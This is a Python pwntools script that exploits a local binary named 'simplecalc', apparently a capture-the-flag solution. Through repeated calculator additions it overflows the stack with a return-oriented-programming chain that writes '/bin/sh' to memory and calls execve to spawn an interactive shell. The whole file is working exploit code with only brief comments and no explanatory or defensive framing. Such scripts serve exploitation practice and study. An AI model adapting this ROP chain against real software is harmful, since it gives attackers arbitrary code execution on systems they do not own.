from pwn import *

target = process("./simplecalc")

syscall = 0x0000000000400488
poprax = 0x000000000044db34
popRdxRsi = 0x0000000000437aa9
poprdx = 0x0000000000437a85
poprdi = 0x0000000000401b73

mov = 0x000000000044526e #mov qword ptr [rax], rdx ; ret
writeto = 0x6c0220
binsh = 0x0068732f6e69622f


def addSingle(x):
  target.recvuntil("=> ")
  target.sendline("1")
  target.recvuntil("Integer x: ")
  target.sendline("100")
  target.recvuntil("Integer y: ")
  target.sendline(str(x - 100))

def add64(x):
	addSingle(x & 0xffffffff)
	addSingle((x & 0xffffffff00000000) >> 32)


target.sendline("100") #num calcs

for _ in range(18):
	addSingle(0)

#Write "/bin/sh" to (writeto)
add64((poprdx))
add64((binsh))
add64((poprax))
add64((writeto))
add64((mov))

add64((poprax))
add64((59))
add64((poprdi))
add64((writeto))
add64((popRdxRsi))
add64((0))
add64((0))
add64(syscall)

target.sendline("5")

target.interactive()






